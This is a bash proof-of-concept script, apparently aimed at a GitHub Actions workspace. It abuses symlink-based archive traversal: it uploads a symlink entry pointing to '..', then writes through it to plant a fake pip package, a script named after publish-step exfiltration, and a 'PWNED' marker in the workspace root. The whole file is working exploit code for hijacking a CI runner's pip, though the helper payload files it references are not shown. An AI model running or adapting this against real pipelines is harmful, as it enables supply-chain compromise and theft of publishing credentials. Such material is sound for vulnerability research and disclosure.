#!/bin/bash
set -u
echo "POC_PLANT_START os=$(uname -s) run=${GITHUB_RUN_ID:-} job=${GITHUB_JOB:-} repo=${GITHUB_REPOSITORY:-}" >&2
if [ "$(uname -s)" != "Linux" ]; then
  echo "POC_PLANT_SKIP non-linux" >&2
  exit 1
fi
if [ -f /tmp/poc_planted ]; then
  echo "POC_PLANT_SKIP already" >&2
  exit 1
fi
touch /tmp/poc_planted
cd "$(dirname "$0")/.." || exit 1
INPUT_NAME='.' INPUT_ENTRIES='[{"name":"p","content":"..","mode":41471}]' python3 poc/upload.py || true
sleep 2
INPUT_NAME='p' INPUT_ENTRIES='[{"name":"pip/__init__.py","content":"","mode":33188},{"name":"pip/__main__.py","file":"poc/pip_main.py","mode":33188},{"name":"poc_publish.py","file":"poc/publish_exfil.py","mode":33188},{"name":"PWNED_TRAVERSAL.txt","content":"symlink unzip traversal reached the workspace root\n","mode":33188}]' python3 poc/upload.py || true
echo "POC_PLANT_DONE" >&2
exit 1
